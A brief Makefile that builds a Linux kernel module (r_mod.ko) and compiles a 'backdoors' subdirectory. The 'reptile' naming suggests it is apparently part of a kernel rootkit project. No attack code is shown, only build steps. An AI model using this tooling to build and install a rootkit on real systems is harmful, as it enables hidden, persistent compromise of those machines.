obj-m += r_mod.o
reptile-objs := r_mod.o

all:
	mkdir -p bin
	cd backdoors && make all
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	cp r_mod.ko bin/r_mod

clean:
	cd backdoors && make clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
